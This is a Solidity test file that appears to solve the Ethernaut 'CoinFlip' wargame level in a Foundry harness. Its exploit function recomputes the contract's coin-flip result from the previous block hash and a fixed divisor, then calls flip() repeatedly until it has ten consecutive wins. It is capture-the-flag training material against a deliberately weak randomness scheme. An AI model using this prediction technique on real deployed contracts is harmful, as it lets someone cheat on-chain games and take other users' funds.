// SPDX-License-Identifier: Unlicense
pragma solidity >=0.6.0;
pragma experimental ABIEncoderV2;

import "./utils/BaseTest.sol";
import "src/levels/CoinFlip.sol";
import "src/levels/CoinFlipFactory.sol";

import "@openzeppelin/contracts/math/SafeMath.sol";

contract TestCoinFlip is BaseTest {
    using SafeMath for uint256;
    CoinFlip private level;

    constructor() public {
        // SETUP LEVEL FACTORY
        levelFactory = new CoinFlipFactory();
    }

    function setUp() public override {
        // Call the BaseTest setUp() function that will also create testsing accounts
        super.setUp();
    }

    function testRunLevel() public {
        runLevel();
    }

    function setupLevel() internal override {
        /** CODE YOUR SETUP HERE */

        levelAddress = payable(this.createLevelInstance(true));
        level = CoinFlip(levelAddress);

        // Check that the contract is correctly setup
        assertEq(level.consecutiveWins(), 0);
    }

    function exploitLevel() internal override {
        /** CODE YOUR EXPLOIT HERE */
        //Run "forge test --match-contract TestCoinFlip -vvvv" for detailed traces
        vm.startPrank(player);
        //FACTOR can be obtained as nothing is private on blockchain
        uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
        //Looping until we gain the consecutive wins i.e. 10
        while (level.consecutiveWins() < 10) {
            //This logic is copied from the contract's flip() function, we are trying to
            //generate the same result as the contract's function
            uint256 blockValue = uint256(blockhash(block.number.sub(1)));
            uint256 coinFlip = blockValue.div(FACTOR);
            bool guess = coinFlip == 1 ? true : false;

            //Calling contract's flip(bool _guess) and passing our calculated guess
            level.flip(guess);

            //Moving one block ahead
            utilities.mineBlocks(1);
        }

        vm.stopPrank();
    }
}
